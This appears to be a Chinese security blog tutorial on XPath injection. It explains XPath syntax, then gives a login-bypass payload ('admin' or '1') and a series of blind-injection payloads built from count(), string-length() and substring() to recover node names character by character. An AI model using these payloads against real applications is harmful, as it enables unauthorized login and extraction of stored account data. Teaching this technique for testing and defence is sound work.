#  XML的Xpath注入攻击技术研究二  
NEURON  SAINTSEC   2025-06-12 09:40  
  
 XPath注入攻击，是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。Xpath注入攻击本质上和SQL注入攻击是类似的，都是输入一些恶意的查询等代码字符串，从而对网站进行攻击。  
  
XPath 即为 XML 路径语言，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。XPath 基于 XML 的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力，可用来在 XML 文档中对元素和属性进行遍历。XPath 是一门在 XML 文档中查找信息的语言，类比来看， XML 为数据库，XPath 为 SQL语言，用于查询数据。所以XPath和SQL类似，也存在注入的攻击方式。  
  
  
**#****0****1**  
  
  
**「 Xpath基本术语 」**  
  
  
  
XPath术语节点在 XPath 中，有七种类型的节点：元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XML 文档是被作为节点树来对待的。树的根被称为文档节点或者根节点。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTYeZC1S1P2EwFyO7VEiblxUJwqcufZX5Exys4SnKmc9BzfDTRxGrfV90V97CCibwV0e6FrMtL7R9Mw/640?wx_fmt=png "")  
  
###   
  
**#****02****‍**  
  
  
**「 Xpath语法 」**  
  
###   
  
<table><thead><tr style="border-width: 1px 0px 0px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);background-color: rgb(240, 240, 240);min-width: 85px;"><span style="font-size: 14px;"><strong><span leaf="">/</span></strong></span></th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);background-color: rgb(240, 240, 240);min-width: 85px;"><span style="font-size: 14px;"><strong><span leaf="">从根节点选取</span></strong></span></th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);background-color: rgb(240, 240, 240);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">*****</span></span></th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);background-color: rgb(240, 240, 240);min-width: 85px;"><span style="font-size: 14px;"><strong><span leaf="">匹配任何元素节点</span></strong></span></th></tr></thead><tbody><tr style="border-width: 1px 0px 0px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">//</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">全局匹配</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">@*</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">匹配任何属性节点</span></span></td></tr><tr style="border-width: 1px 0px 0px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">.</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取当前节点</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">|</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取若干个路径</span></span></td></tr><tr style="border-width: 1px 0px 0px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">..</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取当前节点的父节点</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">node()</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">匹配任何一个节点</span></span></td></tr><tr style="border-width: 1px 0px 0px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">@</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取属性</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">/*[1]</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取匹配到的第一个节点</span></span></td></tr><tr style="border-width: 1px 0px 0px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">//book</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取所有 book 子元素</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">//@lang</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取名为 lang 的所有属性</span></span></td></tr><tr style="border-width: 1px 0px 0px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">//*</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取文档中的所有元素</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">//title[@*]</span></span></td><td style="border-color: rgb(204, 204, 204);min-width: 85px;"><span style="font-size: 14px;"><span leaf="">选取所有带有属性的 title 元素</span></span></td></tr></tbody></table>  
#   
  
**#****03****‍**  
  
  
**「 Xpath注入 」**  
  
#   
  
简单了解了Xpath的原理,接着我们来看Xpath的注入攻击。  
  
**首先来看一段代码案例。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTYeZC1S1P2EwFyO7VEiblxUDHKj5XR5BJ5iaOGKpmnIsa11LvWhenXSosToM4doUoEOe3zekZicpia6g/640?wx_fmt=png "")  
  
这里我们可以直接使用万能密码来进行绕过。  
  
这段测试代码的查询语句：  
```
/root/users/user[username/text()='' and password/text()=‘’]
```  
  
和sql注入类似，考虑如下输入：  
```
u=admin' or '1&p=xxx
```  
  
通过or ‘1’ 构造永真。因为XPath中没有注释，所以需要我们精巧地闭合原语句不同语言的XPath解析方式不同。  
  
对于PHP，or关键字前后可以没有空格。  
  
结合sql盲注，我们下一步需要做什么？  
  
使用一些XPath函数，可以逐步的将数据盲注出来。一般的步骤如下：  
```
1.判断根节点数量：count(/)=12.获取根节点名称长度：string-length(name(/*[1]))=43.逐个字符获取根节点名称：substring(name(/*[1]),1,1)='r'substring(name(/*[1]),2,1)='o'substring(name(/*[1]),3,1)='o'substring(name(/*[1]),4,1)='t'4.判断下一级节点数量count(/root/*)…
```  
  
那么如果我们打环境中无回显且无法报错。  
  
就需要使用盲注。  
```
查询根节点下的节点个数'or count(/)=1  or ''='  ###根节点数量为1'or count(/*)=1 or ''='  ##根节点下只有一个子节点查询根节点下的节点长度'or string-length(name(/*[1]))=8 or ''='查询根节点下的节点名称'or substring(name(/*[1]), 1, 1)='a'  or ''=' 'or substring(name(/*[1]), 2, 1)='c'  or ''=' 'or substring(name(/*[1]), 8, 1)='s'  or ''=' 
```  
```
查询accounts节点下的节点 'or count(/accounts)=1 or ''='  /accounts节点数量为1 'or count(/accounts/user/*)>0 or ''='  /accounts下有两个节点 'or string-length(name(/accounts/*[1]))=4  or ''='  第一个子节点长度为4 'or substring(name(/accounts/*[1]), 1, 1)='u' or ''='  第一个子节点名称为user  
```  
```
查询user节点下的节点'or count(/accounts/user)=2  or ''='    user节点有两个'or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)='u'  or ''=' 'or substring(name(/accounts/user[position()=1]/*[1]), 1)='username'  or ''=' 
```  
  
下面是一个简单的脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTYeZC1S1P2EwFyO7VEiblxUum1FaDq67JF9UqAyGhT9K8S8hplnLoP0pXGUHXVFsBOjDvTEnq0T1A/640?wx_fmt=png "")  
  
  
